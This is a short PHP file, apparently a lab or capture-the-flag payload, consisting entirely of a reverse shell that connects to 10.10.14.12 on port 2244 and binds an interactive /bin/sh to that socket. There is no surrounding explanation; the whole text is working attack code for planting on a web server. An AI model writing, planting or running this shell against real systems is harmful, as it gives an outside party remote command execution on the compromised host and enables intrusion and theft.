<?php
	fsockopen("10.10.14.12",2244);
	exec("/bin/sh -i <&3 >&3 2>&3");
?>
